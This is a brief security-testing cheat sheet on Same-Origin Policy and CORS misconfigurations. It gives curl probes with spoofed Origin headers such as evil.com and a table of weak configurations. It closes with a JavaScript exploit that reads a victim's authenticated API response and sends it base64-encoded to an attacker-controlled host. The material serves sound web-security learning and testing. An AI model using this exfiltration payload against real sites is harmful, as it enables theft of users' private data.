# Same-Origin Policy & CORS misconfigurations

**SOP**: origin = scheme + host + port. A page may *send* to other origins (forms, links, img) but
not *read* responses unless the target allows it with CORS headers.

## Test CORS
```bash
curl -si $T/api/me -H 'Origin: http://evil.com' | grep -i 'access-control'
curl -si $T/api/me -H 'Origin: null'            | grep -i 'access-control'
curl -si $T/api/me -H 'Origin: http://target.evil.com' | grep -i 'access-control'
```
| Response | Problem |
|---|---|
| `Access-Control-Allow-Origin: *` | public data readable by any site (no cookies though) |
| ACAO reflects your Origin + `Access-Control-Allow-Credentials: true` | **any site can read the victim's authenticated data** |
| `null` allowed + credentials | sandboxed iframe exploit |
| Prefix/suffix regex (`target.com.evil.com`) | bypassable origin check |
| Access control based on the `Origin` header alone | spoof it with curl (deck) |

## Exploit (reflected origin + credentials)
```html
<script>fetch('http://TARGET/api/me',{credentials:'include'}).then(r=>r.text())
 .then(t=>fetch('http://YOU/?d='+btoa(t)))</script>
```
Also from the deck: long `Access-Control-Max-Age` caches stale policies; trust between sites means
compromising one exposes the other.
